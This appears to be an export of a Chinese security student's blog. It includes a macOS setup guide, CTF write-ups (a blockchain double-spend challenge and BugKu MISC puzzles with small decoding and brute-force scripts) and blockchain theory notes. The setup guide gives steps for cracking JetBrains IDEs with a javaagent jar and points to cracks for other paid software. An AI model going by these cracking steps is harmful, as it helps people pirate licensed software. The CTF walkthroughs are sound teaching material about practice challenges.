命令：xcode-select --install安装Xcode Command Line Tools ​ 虽然不开发苹果软件，但其内置了一些基于linux的必要工具。 ​ 2..Homebrew+iTerm2+zsh # 使用系统自带的 ruby 安装 Homebrew /usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot; 不过下载速度10几k，每次都失败。网上找了一堆文章尝试后，终于解决！某国家级大型网络设备真坑！ ​ 链接：https://blog.csdn.net/qq_35624642/article/details/79682979（有两处替换，但是下载的文件只能搜到一处，所以我把第二处替换直接加上尝试竟然成功了…!） ​ 上面文章也包括了更换国内的源，使brew更快。 ​ brew安装上后直接安装一些linux必要的工具或软件： ​ vim、git、node、python3、wget等等有的ios自带了。 ​ 都说iTerm2+zsh牛x，那给我也整一个吧。 ​ 附链接：https://www.cnblogs.com/xishuai/p/mac-iterm2.html ​ 3.IDE安装与破解 我选择JetBrains全套：CLion、Pycharm、PhpStorm、Intellij IDEA、Goland ​ 下载后破解即可。在http://idea.lanyus.com/可获取破解教程（有的方法不行） ​ 尝试一番后，选择了本地破解。本地破解也不算难。由于JetBrains全家桶本地破解流程一样，索性直接把可能会用到的语言IDE全部安装了，省的以后用到再麻烦。（装这么多IDE放桌面，也zhuangb） ​ 本地破解流程： ​ - 1.官网下载，打开dmg文件正常安装，在访达里面找到应用程序，显示包内容 ​ ​ - 2.安装完成后把破解包复制到/Contents/bin文件夹下 ​ ​ - 3.JetBrains全套基于Java开发，打开虚拟机设置文件xxxx.vmoptions，在最后添加一条命令： -javaagent:../bin/JetbrainsIdesCrack-4.2-release.jar ​ - 注：xxx是IDE的名字，添加代码的命令要和自己破解包的名字一样。 ​ ​ - 4.打开IDE，选择Activation code填写上面链接获取的注册码，选择ok破解完成。 ​ ​ 4.开发环境 网上有多种选择： ​ - 1.有IDE，可以直接新建build-in Web Server，即使没有Apache、Nginx就可以本地解析运行。 ​ - 2.mac自带php和apache，只需本地安装数据库（如mysql） ​ 在PhpStorm新建PhpWebPage打开Apache（提前修改配置文件把目录改成自己项目目录），然后在PhpStorm配置好默认路径即可。（也可以用其他文本编辑器） ​ mysql用brew install mysql即可（如果用官方dmg安装还得配置环境（和win配置环境变量一个道理），把文件地址导入到文件即可，bash是~./bash_profile，zsh是~./zshrc） ​ ​ 然后安装Nacicat可视化数据库管理软件来管理数据库。 ​ Nacicat安装与破解链接：https://blog.csdn.net/marswill/article/details/79808416 ​ ​ - 3.docker搭建环境，把本地代码文件映射到docker ​ docker相比来说更加灵活、省空间。但是需要熟悉docker。 ​ docker官网下载免费安装即可。 ​ ​ 总的流程分为三部： ​ - a.编写好各个软件的dockerfile ​ - b.编写好配置文件 ​ - c.通过docker-compose处理所有的dockerfile（包括将配置文件扔进dockerfile文件构建的镜像中） ​ ​ ​ 5.渗透环境 - kali足矣 ​ 6.CTF环境 - kali+mac+win（部分misc工具可能需要）三者切换吧 ​ 7.re或pwn环境 等学了用到再说吧 ​ 8.其他软件 免费，直接AppStore或者官网下载： ​ - 谷歌浏览器（数据同步真好） ​ - Shadowsocks（fq必备） ​ - 有道云笔记（感觉比印象笔记好用） ​ - 有道翻译（好用） ​ - Typora（写md） ​ - FDM（防断点下载，大文件下载断点就GG了） ​ - 百度网盘（限速太恶心了，网上说的Aria2GUI也不行，目前没找到防限速方法） ​ - wps（有时候还是得弄点文件、ppt啥的） ​ - Dr.Cleaner（免费清理工具，时间长了偶尔清理一下） ​ - QQ、微信 ​ ​ 需要破解： ​ - Parallels Desktop（虚拟机软件，kali很流畅！比win用vm爽多了！最牛x的是bootcamp直接可以把我机械硬盘里面的win10开启，注意：在BIOS里面开启虚拟设置） ​ - Sublime text3（主要还是写python或php的脚本和编辑用比较灵活方便） ​ - XMind（画思维导图） ​ - Dash（集成了各个语言和框架的文档手册！程序猿搬砖必备！不过全是英文…）、 ​ - 01Editor（二进制分析工具，打ctf可能会用到） ​ - PS（可能会用到，先安装破解再说） ​ 附mac精选软件链接：https://ihtcboy.com/2018/07/15/2018-07-15_%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84macOS%E7%B3%BB%E5%88%97%EF%BC%9A%E7%B2%BE%E9%80%89MacApp/ 0x04.总结 一天准备一天半安装三天配置，基本一周就过去了。。。以后好好学习，天天向上。]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018DDCTF-mini-blockchain分析]]></title>
    <url>%2F2019%2F03%2F07%2F2018ddctf-mini-blockchain-%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[去年的题目，现在仍然开着：http://116.85.48.107:5000/b942f830cf97e/分析一遍代码感觉对区块链又加深了理解。下一步自己尝试写一写题意：银行发行了100W的DDB，黑客append两个区块转给自己99W9999。让我们找回钱并且在商店花200W买两个钻石。1.信息收集：把首页杂乱的信息整理得到信息：创世区块地址银行地址及资金：1黑客地址及资金：999999商店地址及资金：0得到信息：UTXO-1：向黑客地址转资金999999UTXO-2：向银行地址转资金1得到信息：创世区块高度为0，资金100W黑客append空块高度为2得到信息：黑客把银行地址100W资金转到高度为1的区块99W9999，转到银行地址1。留下一句：HAHA, IM THE BANK NOW!2.源码分析注：为了看得更清楚，注释用的//Flask框架,默认url：/b942f830cf97eFLAG()函数，返回GLAG。 查看路由得到信息： /默认路径下展示homepageget_balance_of_all()输出所有账户余额及UTXO，及整个函数返回：创世区块、地址、UTXO、区块链、查看源码的信息/flag路径下，如果你的钻石&gt;=2调用FALG()函数输出flag。否则输出钻石不够要向商店地址转100W才得到一个钻石 /5ecr3t_free_D1diCoin_b@ckD00r/路径下，可以在银行地址向指定地址转账。尝试一下：我们可以在这里知道转账的代码，可以模仿写出自己的转账代码。 /create_transaction路径POST访问创建交易，尝试一下。看来只能用脚本了。。。怪不得题目建议用脚本。然后我们可以看出代码意思：如果商店地址有100W则给你一个钻石，然后立马把商店地址的100W转到商店钱包。 /reset路径,如果把链搞砸了可以重置区块链/source_code路径，可以查看源码 在我们看路由的时候发现了很重要的信息：工作量证明难度要求hash值00000开头 然后审计具体函数：计算参数hash摘要信息。而且是先md5再sha256,更加加固了信息摘要安全性。 哈希运算，我们定位使用该函数的地方，可以看到是python的reduce()函数调用，该函数是对第一个参数(函数)运算后的值与第二个参数运算。在区块链中应该是来更容易计算：父区块hash+本区块hash+随机数reduce函数使用规则可以参考一下链接：http://www.runoob.com/python/python-func-reduce.html定位调用reduce的函数找到，这三个函数直接返回reduce函数的计算值，来计算UTXO、TX、Block的hash值。 来限制格式必须是字典容器模型格式或JSON格式，如果attrs参数中所有值有没在d参数中的则抛出异常。定位一下使用has_attrs()函数的地方:在添加块中要求block必须有三元素：前一区块hash值、nonce值、汇报在交易中必须有：输入、输出、签名在UTXO中必须有：资金数量、地址、id值 所以我们可以知道各个字段的包含关系： 常量hash值，64个0。在计算hash值得时候用到在python中验证一下字符串*数字结果。 地址是N，65537是e，返回地址的私钥d（RSA参数，不懂可百度）来验证。 生成钱包地址(公钥)及私钥。 签名函数，把交易信息用私钥加密得到签名摘要。 创建一个交易输出，参数为目的地址和资金数量 创建一个交易，其中签名为把交易id通过私钥加密 创建一个区块，包括三要素：前一区块hash值、nonce值、汇报。前一区块hash值必须是16进制且限制nonce长度要小于128。查找区块链中最后一个区块,返回其高度？ 获取所有的UTXO信息 计算钱包的余额。默认三个地址都为0，循环累加UTXO中每个地址的资金，返回各个地址的余额。 验证UTXO签名。其实就是rsa的解密过程。签名为密文，地址为公钥，解密算出明文（信息摘要）正确，则证明了是交易人地址验证签名正确。 添加区块，过程略微复杂，主要是验证添加的区块是否满足规范，否则抛出异常。大致过程如下：1.验证三要素。(第三要素”交易”又有输入、输出（输出即UTXO又包含id值、资金数量、地址）、签名)。包括验证输出要小于输入等等可能出现问题的地方。2.创建区块（包含三要素），产生区块hash。保证区块hash值满足规范但又小于difficulty值。3.区块链高度加一，且长度不能超过50。 设置session，有区块和我们的钻石数。首先产生创世区块100W资金，然后银行被黑客添加区块转账99W9999，黑客又添加了空块。 得到所有信息函数。在主页调用了，我们看到的主页信息就是调用了该函数。 3.构造思路由于没有别人来挖矿（添加区块）即我们拥有100%算力。可以结合51%算力攻击，我们可以随意添加区块来改变主链方向。同时也可利用双花攻击来达到双次花费。初始信息：通过append区块把钱找回：同时我们关注代码部分，shop会立即把钱转到shop钱包即目前情况为：那么我们就可以再次分叉来发动双花攻击了。 此时主链已经成为：1-2(2)-3(2)-4(2)-5(3)-6(3)已经覆盖shop把钱转到自己钱包，100W又到了shop所有又获得1个钻石。 4.Payload脚本参考：一叶飘零师傅 获取初始session，抓取主页信息。贴一下源码中的函数及常量，以便我们使用。写好挖矿脚本，爆破遍历nonce满足小于difficulty且’00000’开头添加第一个自己的区块，注意header的构造：添加Content-Type为json。按照思路逐个提交构造的区块，然后再访问/flag目录即可得到falg。]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[比特币理论基础笔记]]></title>
    <url>%2F2019%2F02%2F25%2F%E6%AF%94%E7%89%B9%E5%B8%81%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[一、概念2008年中本聪发明比特币 1.微观：数字货币，其价值来源于人对其的信任和共识。 2.宏观：去中心化的记账系统二、比特币特点1.财产只受自己控制（银行可以认为你的钱不合法而收缴，而比特币只有自己的私钥控制） 2.无通货膨胀（比特币总量2100万个不变，不会贬值） 3.无假钞（共识机制） 4.流通性好（点对点） 5.不可篡改（去中心化） 6.隐私性（无个人信息） 三、比特币原理1.账本如何验证？ ①与所有人的账本一一核对（效率低，方案不通） ②Hash（上一个区块的Hash+本区块信息），则只需要核对最后一个区块的hash值就可以验证账本 哈希函数：MD5、SHA1、SHA256 哈希函数特点： ①同样原始信息用同一个哈希函数总能得到相同的摘要信息 ②原始信息任何微小的变化都会哈希出面目全非的摘要信息 ③从摘要信息无法逆向推算出原始信息，即单向函数 哈希函数主要用途：验证文件是否被修改 2.账户的所有权问题？ 比特币地址 私钥：谁拥有私钥谁就拥有比特币地址，即拥有支付权 比特币地址和私钥是一个非对称关系，私钥通过hash运算可以得到比特币地址，但是不能通过比特币地址逆向推算私钥。 账户的所有权问题变为：不泄漏私钥的情况下证明拥有某个比特币地址的私钥？答：非对称加密技术 交易签名： ①交易进行hash得到摘要信息 ②用摘要信息和私钥进行签名运算得到签名信息 签名（加密）信息后，再广播签名信息和原始交易记录，再通过非对称密码技术验证（解密），验证通过后添加该区块。 签名就是加密，验证就是解密。 3.为什么记账？（同时也是比特币发行的过程） 记账规则： ①一段时间内只有一个人可以记帐成功 ②通过解决密码学难题（即工作量证明，即挖矿）竞争获得唯一记账权（直接验证hash值谁都可以记账，所以引入工作量证明机制） ③其他节点复制记账结果 工作量证明：通过爆破随机数，找到满足规则随机数后则得到唯一记账权 过程计算量很大，目前已经没有单独矿工挖矿。一般都是矿工组合成矿池，通过算力比来分成收益。过程非常耗电，所以从经济学角度只要有收益就会有矿工加入挖矿，最终会达到挖矿成本接近收益。 交易记录集： ①收集广播中还没有被记录账本的交易 ②交易的有效性验证 ③添加一笔给自己转账的交易（挖矿奖励） 4.两个节点同时完成工作量证明（分叉），使用谁的区块？共识机制（选择累计工作量最大的区块，最长的链为主链） 由于网络不确定性会产生孤块 四、比特币工作流程1.节点分为：①发送节点②接收节点 发送节点在比特币体系里就是用于提交交易信息的用户。接收节点在比特币体系里面就是通常指矿工。 如果有新的交易要提交，那么发送节点就会在比特币网络进行交易信息的广播。矿工则要一直监听比特币网络里是否有交易广播。 2.矿工收到广播的交易信息后，需要校验这个信息的签名等内容是否合法。如果校验通过后，就需要将收到的所有交易信息按照一定的规则组装成一个数据块，也就是区块。 3.刚刚组装的区块还只是在自己这里，还未被纳入比特币网络中正式的区块链中。 如何才能被正式纳入呢？这里就涉及到共识算法了。 因为每个矿工都可能组装了自己的区块，在每10分钟之内，只可能有一个区块被纳入正式区块链，那么所有的矿工就要根据规则在最短的时间内使自己的区块被其它矿工认可，谁最先做到，那么谁的区块就会被正式纳入。 4.能纳入区块链的规则就是共识算法，比特币中使用的共识算法是工作量证明法。即让所有的矿工都去寻找一个随机数，这个随机数是通过Hash算法算出来的，并且算出来的随机数需要满足一定的条件才是大家认可的随机数（需要满足该随机数能使整个区块的哈希值小于目标值），谁先计算/猜到这个随机数，它的区块就能被全网接受。 5.然后这个区块就可以纳入正式区块链，放到链条的最后面，然后各个节点再开始挖下一个区块，就这么一直接连接下去。 6.挖到有效区块的节点可以获得奖励，这个奖励主要有2部分组成： ①比特币体系约定每挖到一个有效区块奖励25比特币。 ②交易手续费。（交易信息的提交节点需要以比特币形式付这一笔交易手续费）]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[区块链理论基础整理]]></title>
    <url>%2F2019%2F02%2F24%2F%E5%8C%BA%E5%9D%97%E9%93%BE%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[一、历史 密码朋克（cypherpunk）（包含很多密码学家大佬） ​ 2008年中本聪发明比特币 ​ 1.微观：数字货币，其价值来源于人对其的信任和共识。 ​ 2.宏观：去中心化的记账系统二、区块链是什么 区块链本质就是一个分布式数据库。（该数据库由一串使用密码学方法产生的数据区块有序链接而成，区块中包含有一定时间内产生的无法被篡改的数据记录信息） ​ 数据库记录的内容可以因应具体的业务而变化，没有特殊的设定。网络上每一个节点都有一个全量的数据库副本，每一个节点都可以写入数据，并将数据同步到其它节点中去。 ​ 区块链之所以叫区块链，是因为它由区块和链表组成。每个区块都包含2部分： 1.区块头 区块头记录了其父区块的哈希值、本区块的哈希值和生成时间等信息。每一个区块的哈希值都是不一样的，根据其区块体的内容和上一个区块的哈希值生成。 2.区块体 区块体记录的就是具体的业务数据。（比特币为例，其区块体记录了比特币网络中发生的每一笔交易数据。） ​ 可以对区块体的内容进行加密，保证数据只公开给有访问权限的人。 ​ 每个区块都有一个父区块的指针，就形成了区块链。 三、区块链能做什么 如果区块链只是一个分布式的数据库。区别于其他数据库，其最大的特点就是去中心化。 ​ 传统的数据库都是主从的模式，读操作在从库完成，写操作都是在主库完成，主库就是一个中心化的库。而区块链在每一个节点都能进行写操作，没有一个中心化的库存在。再结合上文提到的防篡改的特性，区块链有很高的置信度。就算某个节点被黑客攻破，也不会影响到其它节点。而中心化的数据库一旦主库被黑或者被管理员删库，就GG了。 ​ 基于区块链极高的置信度和可靠性，所有交易类的场景都能应用上。目前用的最广泛的就是数字货币。在其它小范围的商业场景下，也会利用区块链做一些商业联盟之间的业务。比如金融行业，保险公司跟银行之间的委托保险买卖业务；供应链各个环节的数据追踪；数字化作品的版权确认等。 四、区块链不能做什么 因为区块链是一个分布式的数据库，就涉及到数据的同步问题。而将新的数据同步到全网是一个非常耗时的过程。以比特币为例，确认一笔交易平均需要1个小时的时间。另外，区块链也不擅长处理高并发的业务。目前来说，其每秒最多也只能并发处理500个请求。所以对于实时性要求高的业务，区块链并不合适。 五、区块链特性1.去中心化 区块链在每一个节点都能进行写操作，没有一个中心化的库存在。 2.不可伪造3.不可篡改 由于各个区块根据区块的哈希值串联起来，而区块的哈希值是根据区块体的内容和上一个区块的哈希值而生成的。一旦对区块的内容进行了更改，哈希值就会改变。这会导致它子区块的哈希值会跟着变，一直传导到各个子孙区块。如果没有51%的节点配合，这种篡改是不可能生效的。 4.不可复制5.匿名6.基于密码学7.分布式8.可溯源9.账本公开 六、区块链缺点1.效率 数据写入区块链，最少要等待十分钟，所有节点都同步数据，则需要更多的时间。 2.能耗 区块的生成需要矿工进行无数无意义的计算，非常耗费能源。 ​ 因此，区块链的适用场景，其实非常有限。 ​ 1.不存在所有成员都信任的管理当局 ​ 2.写入的数据不要求实时使用 ​ 3.挖矿的收益能够弥补本身的成本 七、区块链类型根据网络范畴：1.共有链 特点：完全对外开放，任何人都可以任意使用，没有权限的限定，没有身份认证，不但可以任意参与使用，而且发生的所有数据都可以任意查看，完全公开透明。 ​ 例子：比特币、EOS、eth、NEO 2.私有链 特点：不对外开放，仅在组织内部使用。需要提交身份认证，而且具备一套权限管理体系。 ​ 例子：企业的票据管理、财务审计、供应链管理 3.联盟链 特点：联盟链的网络范围结余共有链和私有链之间，通常是使用在多个成员角色的环境下。往往由不同权限的成员 参与，一般也是具有身份认证和权限设置。 ​ 例子：R3CV、IBM farbric、 4.主流项目根据部署环境：1.主链 最长的链。部署在生产环境中真正的区块链系统，只有主链才会真正被推广使用，各项功能的设计都相对完善。 2.测试链 测试用，可更改算法测试。 根据对接类型：1.单链 能够单独运行的区块链系统 2.侧链 将不同的链结合起来的区块链。侧链能起到一个对主链功能扩展的作用，很多在主链中不方便实现的功能可以在侧链中实现，而侧链再通过与主链数据交互增强自己的可靠性。 3.互联链 各个区块链互联。类似互联网。 八、区块链架构v1.0 比特币 ​ v2.0 以太坊、智能合约、eth（主要与金融领域结合） ​ v2.0最大的特点就是支持智能合约。在以太坊中，使用智能合约开发工具开发合约程序，并且编译为字节码，最终部署到以太坊的区块链账本中。部署后的智能合约是运行在虚拟机上的，成为“以太坊虚拟机”。正式通过这样的智能合约的实现，扩展了区块链系统的功能。 v3.0 社会、物联网、存储（区块链与各个行业融合） ​ 超越了对数字货币或者金融的应用范畴，而将区块链技术作为一种泛解决方案，可以在其他领域使用，比如行政管理、文化艺术、企业供应链、医疗健康、物联网、产权登记等，可以认为是面向行业应用。 ​ 行业应用一般是需要具备企业级属性（比如身份认证、许可授权、加密传输等）并且对数据的处理性能也会有要求，因此企业级场景下的应用，往往都是联盟链或者私有链。 九、区块链协议分层6.应用层 转账和记账等功能 5.合约层 基本代码 ​ 算法机制 ​ 智能合约 4.激励机制 发行机制 ​ 分配机制 3.共识层 POW ​ POS ​ DPOS ​ DBFT ​ 其他 2.网络层 p2p网络 ​ 传播机制 ​ 验证机制 1.数据层 区块数据 ​ 链式结构 ​ 数字签名 ​ 哈希函数 ​ Merkel树 ​ 非对称加密 十、区块链工作流程步骤1.发送节点将新的数据记录向全网广播2.接收节点对收到的数据记录信息进行检验，比如记录信息是否合法，通过检验后，数据记录将被纳入一个区块中3.全网所有的接收节点对区块执行共识算法（有工作量证明法、权益证明法等）4.区块通过共识算法过程后被正式纳入区块链中存储，全网节点均表示接受该区块，而表示接受的方法，就是将该区块的随机散列值视为最新的区块散列值，新区块的制造者将以区块链为基础进行延长 比特币为例： ​ 1.节点分为：①发送节点②接收节点 发送节点在比特币体系里就是用于提交交易信息的用户。接收节点在比特币体系里面就是通常指矿工。 如果有新的交易要提交，那么发送节点就会在比特币网络进行交易信息的广播。矿工则要一直监听比特币网络里是否有交易广播。 ​ 2.矿工收到广播的交易信息后，需要校验这个信息的签名等内容是否合法。如果校验通过后，就需要将收到的所有交易信息按照一定的规则组装成一个数据块，也就是区块。 ​ 3.刚刚组装的区块还只是在自己这里，还未被纳入比特币网络中正式的区块链中。 如何才能被正式纳入呢？这里就涉及到共识算法了。 因为每个矿工都可能组装了自己的区块，在每10分钟之内，只可能有一个区块被纳入正式区块链，那么所有的矿工就要根据规则在最短的时间内使自己的区块被其它矿工认可，谁最先做到，那么谁的区块就会被正式纳入。 ​ 4.能纳入区块链的规则就是共识算法，比特币中使用的共识算法是工作量证明法。即让所有的矿工都去寻找一个随机数，这个随机数是通过Hash算法算出来的，并且算出来的随机数需要满足一定的条件才是大家认可的随机数（需要满足该随机数能使整个区块的哈希值小于目标值），谁先计算/猜到这个随机数，它的区块就能被全网接受。 ​ 5.然后这个区块就可以纳入正式区块链，放到链条的最后面，然后各个节点再开始挖下一个区块，就这么一直接连接下去。 ​ 6.挖到有效区块的节点可以获得奖励，这个奖励主要有2部分组成： ​ ①比特币体系约定每挖到一个有效区块奖励25比特币。 ​ ②交易手续费。（交易信息的提交节点需要以比特币形式付这一笔交易手续费） 十一、区块链应用1.资产：数字资产发行、支付（跨境支付）、交易、结算2.记账：股权交易、供应链金融、商业积分3.不可篡改：溯源、众筹、医疗证明、存在性证明4.点对点：共享经济、物联网5.隐私：匿名交易 十二、区块链的安全问题1.区块链安全是因为其不可更改特性和分布式特性。 即如果要修改区块链中的数据，必须完成下面两件事情： ​ ①你需要计算出修改区块之后的所有区块的哈希值，这需要非常庞大的计算能力。 ​ ②你需要让超过50%的区块链用户同意你的修改。同时完成上面两件事情在短时间（甚至较长时间）内基本上是不可能的，所以区块链很安全。 2.51%攻击 举个例子： ​ 假设我具备了全网51%的算力，那么我可以偷偷的计算出一个这样的区块链，包含所有的比特币交易到我的私人账户的信息。这个区块链的长度为10，但是我不向全网进行广播。同时，我将所有的比特币放入到交易市场进行售卖。这笔交易记录在正常的区块链中。 ​ 当我交易所得美元进行提取时，正常的区块链长度应该是9。而我的隐藏的区块链长度是10，同时，将这个区块链广播到网络中去，然后通过观察网络会认为我后发的区块是正确的，从而到达修改了那笔交易记录的目的。 3.双花问题 何为双花问题？从表意上来说，就是一个人在同一时间进行了两笔交易。这个问题，一直是支付系统的难点。无论是中心化的支付系统，还是去中心化的交易系统，都得面对这个问题。 ​ 举个例子： ​ 某人手里有20块钱。他同时与两个人进行了一笔20块钱的交易。现实生活中，你可以明确地发现问题。但是，相对于支付系统而言，并发的情况经常发生。一旦一个不完善的支付系统，双花问题是很容易发生的。当然，后端处理过程中，可以通过队列的形式来解决问题。但是，对于去中心化的交易系统而言，这个问题也需要解决。 每一笔交易的产生，都会产生一个区块，那么，往往会发现这么一种情况，如图： 我们可以看到，Block A和Block B就会同时去连接上一个区块。那么，相对于这个问题，比特币系统采用的规则就是选最长的那条链。通常，比特币采用的是6次确认规则。在1小时内，根据10分钟产生一个区块的原则，往往会生成一条6个长的区块。那么，只要确认下这条区块，就可以避免去连接其他区块了。 ​ 理论上是，区块链越长，准确性越高。]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Think PHP框架漏洞梳理]]></title>
    <url>%2F2019%2F02%2F24%2FThink%20PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86%2F</url>
    <content type="text"><![CDATA[文章发在SKSEC公众号：【表哥有话说 第27期】文章链接：https://mp.weixin.qq.com/s?__biz=MzU1MjI5MDY3Nw==&amp;mid=2247484044&amp;idx=1&amp;sn=8cfa3b32f3ef13de16beebd4a9256910&amp;chksm=fb851296ccf29b80ad7b551a5c78d10a4a7c0571ad5c4e68f042feada72343185012614afded&amp;mpshare=1&amp;scene=23&amp;srcid=#rd 欢迎大家关注SKSEC！]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>ThinkPHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BugKu-MISC-WP史诗全集]]></title>
    <url>%2F2018%2F12%2F10%2FBugKu-MISC-WP%E5%8F%B2%E8%AF%97%E5%85%A8%E9%9B%86%2F</url>
    <content type="text"><![CDATA[一、信息收集与社工1.签到微信扫面二维码回复：flag得flag。2.猜提示是某人姓名全拼音，运用谷歌识图搜到是liuyifei。二、编码分析1.多种方法解决用NotePad++打开发现是python的b64img模块把图片转换成文本的文本。直接在线还原base64编码的图片的二维码，扫面得flag2.普通的二维码 扫码说：flag就在这里。各种分析方法发现都没用。最后在文本最后发现一串数字 没有8，应该是八进制然后把八进制转换成字符应该是flag，每三个数字一组写个脚本。 c = ‘146154141147173110141166145137171060125137120171137163143162151160164137117164143137124157137124145156137101163143151151041175’flag = ‘’for i in xrange(0,126,3): flag += chr(int(c[i:i+3],8)) print flag 运行脚本得到flag 3.convert 写个脚本把二进制转换成字符存到一个新文件 import libnum​file = open(‘1.txt’,’r’)​f = file.read()c = f.replace(‘\r\n’,’’)m = libnum.b2s(c)print m​getflag = open(‘flag’,’wb’)getflag.write(m)file.closegetflag.closeprint ‘ok！！！’ 在linux里面直接检查到文件格式为rar 解压图片查看exif找到base64字符，python解码base64即可得flag 4.就五层你能解开吗 感觉这个题目多为密码题，就放这里吧… 给出了提示：第一层为CRC32碰撞 打开压缩包可以看见CRC32校验码分别为：0x7c2df918、0xa58a1926、0x4dad5967分别爆破 把有意义的连接起来得到解压密码：_CRC32_i5_n0t_s4f3 第二层为维吉尼亚密码，给出了key和Hint。但是KEY有点多 看网上有人说猜测开头字母可能是什么然后猜是the，对应开头秘钥为YEWCQGEWCYBNHDHPXOYUBJJPQIRAPSOUIYEOMTSV解密找到秘密 第三层SHA1碰撞 上python脚本 #encoding:utf-8import stringimport hashlib​keys = string.ascii_letters + string.digits + string.punctuation​def sha1(s):• sha1_hash = hashlib.sha1()• sha1_hash.update(s)• return sha1_hash.hexdigest()​for i in keys:• for j in keys:• for p in keys:• for q in keys:• password = i + ‘7’ + j + ‘5-‘ + p + ‘4’ + q + ‘3?’• sha = sha1(password.encode(‘utf-8’))• if sha[0:7] == ‘619c20c’ and sha[8] == ‘a’ and sha[16] == ‘9’:• print(password) 得到解压密码 第四层md5相同文件不同 百度就能找到HelloWorld-colliding.exe和GoodbyeWorld-colliding.exe两个文件不同但是md5值相同。得到解压密码：Goodbye World :-( 第五层RSA解密 得到两个文件.enc和.pem 解法一：直接用RSA-Tool快速解题 解法二： 用Openssl提取N和E，发现都很大。应该是维纳攻击（低解密指数攻击） 然后用Wienerattack攻击的脚本跑一下得到d=8264667972294275017293339772371783322168822149471976834221082393409363691895 然后用python的rsatool生成私钥。这里有个问题，脚本比较老用的gmpy。而我不知道为何始终没有解决安装老的gmpy库，最后是把脚本里面的gmpy全部改成gmpy2就好了。 用Openssl和私钥解密得到flag openssl rsautl -decrypt -in flag.enc -inkey key.pem -out flag.txt 三、取证隐写(一)、图片隐写1.这是一张单纯的图片 用NotePad++打开发现最后附加了一段Unicode编码。解码得flag 2.隐写 PNG图片，NotePad++打开后发现有一段IHDR字样。 猜测是利用Window忽略CRC检验码然后修改高度和宽度后仍然可以显示来隐藏信息。 然后我们放到Kali linux下面，果然无法显示（Linux会检验CRC检验码） 然后用01Editor打开修改IHDR后面的后八位（前四位为长，后四位为宽）把后四位的A4改为F4，即改为正方形，保存显示flag。 3.啊嗒 省赛题目，前面写过wp就不写了。答题思路就是binwalk分析分离压缩包，通过exif信息找到压缩包密码解压即可。 4.又一张图片，还单纯吗 binwalk分析有很多夹杂的信息，用Foremost提取一下，直接提取出flag图像。 5.隐写2 首先用NotePad++打开文件，最后发现flag.rar binwalk分析，foremost分离。 打开压缩包发现又一个flag.rar和一个提示jpg 根据提示是3位数密码，然后公共爆破工具爆破得到密码。 解压得到一张图片，然后用Notepad++打开，最后找到flag 6.闪的好快 gif图片，很多张二维码不停跳，用StegSolve的Frame Brower打开一个个扫拼接得到flag。 最后扫描完拼接得:SYC{F1aSh_so_f4sT} 7.隐写3 下载压缩得到PNG图片，用010Editor打开发现IHDR。观察图片感觉明显窄很多。修改高度得到flag。（原理同2.隐写） 8.细心的大象 图片的文件exif有信息，但是不是flag。然后在kali linux下binwalk分析发现有RAR压缩包，foremost分离 发现一个加密的压缩包，这个时候就用到exif里面的备注了。当时直接当密码不行。需要base64解密才可以。解密后得到一张图片 貌似很熟悉的样子。上面题目刚做了。然而这次修改高度貌似显示不了，用StegSolve查看得到flag 9.爆照 Notepad++打开发现文件尾部有一段.gif的信息 binwalk分析，foremost分离得到压缩包 解压后得到一堆88888的未名文件 放到kali里面分析，直接显示为图片，而且很容易发现88有二维码扫面得bilibili 挨个binwalk分析发现88、888、8888存在修改痕迹，且8888里面夹杂zip。 分离zip发下二维码得到panama 看下888的exif 得到base64，解密得silisili 最后按照顺序连接得到flag 10.猫片 png图片。下载后常规分析：搜索、查看exif、二进制分析、CRC校验都无果。 提示：LSB、BRG（有错误，估计打错了，应该是BGR）、NTFS 用StegSolve打开LSB最低位通道查看，发现BGR里面数据是PNG图片的数据 Save Bin后用010Editor打开，发现不行。用WinHex就可以。把开头四字节删了保存，发现了一半二维码。 放到linux里面看一下是否存在CRC校验失败（判断是否修改了高度）。 果然，修该高度后找到全的二维码 但是貌似有一点莫名的异样。原来是黑白正好相反。通过StegSolve就可以查看xor后的图像了，扫面后是一个网盘，下载flag.rar 没有flag。但是我们还有一条信息没用到：NTFS。猜测应该是NTFS隐写 用NSE打开扫描发现确实 是个pyc文件，关于pyc文件我之前写过。就是编译后的py文件，在线反编译一下得到源代码 import base64​def encode(): flag = ‘*****‘ ciphertext = [] for i in range(len(flag)): s = chr(i ^ ord(flag[i])) if i % 2 == 0: s = ord(s) + 10 else: s = ord(s) - 10 ciphertext.append(str(s)) ​ 1return ciphertext\[::-1\] ciphertext = [‘96’,’65’,’93’,’123’,’91’,’97’,’22’,’93’,’70’,’102’,’94’,’132’,’46’,’112’,’64’,’97’,’88’,’80’,’82’,’137’,’90’,’109’,’99’,’112’] 写一个解密脚本解密得到flag # -- codeing: UTF-8 --​import base64​def decode(): ciphertext = [‘96’,’65’,’93’,’123’,’91’,’97’,’22’,’93’,’70’,’102’,’94’,’132’,’46’,’112’,’64’,’97’,’88’,’80’,’82’,’137’,’90’,’109’,’99’,’112’] flag = ‘’ ciphertext.reverse() #因为加密用到了append()函数 for i in range(len(ciphertext)): if i % 2 == 0: s = int(ciphertext[i]) - 10 else: s = int(ciphertext[i]) + 10 s = chr(i ^ s) flag += s return flag​def main(): flag = decode() print flag​if __name__ == ‘__main__‘: main() 11.多彩 下载后图片名字是：lipstick。翻译是口红的意思… 结合图片颜色应该是不同的口红色号吧 用StegSolve打开后找到这么一段信息 